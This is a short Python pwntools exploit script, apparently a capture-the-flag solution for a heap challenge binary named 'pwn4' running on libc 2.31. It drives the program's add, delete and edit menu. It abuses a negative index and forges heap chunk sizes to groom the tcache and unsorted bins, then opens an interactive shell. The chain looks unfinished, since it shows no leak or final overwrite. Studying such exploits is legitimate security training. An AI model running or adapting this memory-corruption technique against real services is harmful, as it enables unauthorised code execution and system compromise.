from pwn import *
import sys
remote_addr = ["",]
libc=ELF('./libc-2.31.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = gdb.debug("./pwn4", gdbscript='''
		b *$rebase(0x14f7)
    	b *$rebase(0x16a1)
    	b *$rebase(0x153f)
	''')
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def add(index, size, content=b'/bin/sh\x00'):
    ru(b'is:')
    sl(b'1')
    ru(b'index:\n')
    s(str(index))
    ru(b'size:\n')
    s(str(size))
    ru(b'content:\n')
    sl(content)

def delete(index):
    ru(b'is:')
    sl(b'2')
    ru(b'index?\n')
    s(str(index))

def edit(index, content):
    ru(b'is:')
    sl(b'3')
    ru(b'index?\n')
    s(str(index))
    ru(b'new content:\n')
    sl(content)

def pwn():
    for i in range(11):
        add(i, 0x70)
    edit(0, p64(0) * 9 + p64(0x81))
    edit(1, p64(0) * 9 + p64(0x31))
    delete(0)
    delete(10)

    edit(-60, b'\xf0')
    add(10, 0x70)
    add(0, 0x70, p64(0) * 5 + p64(0x481))
    for i in [1, 2, 3, 4]:
        delete(i)
    for i in [1, 2, 3, 4]:
        add(i, 0x50)

pwn()
shell()
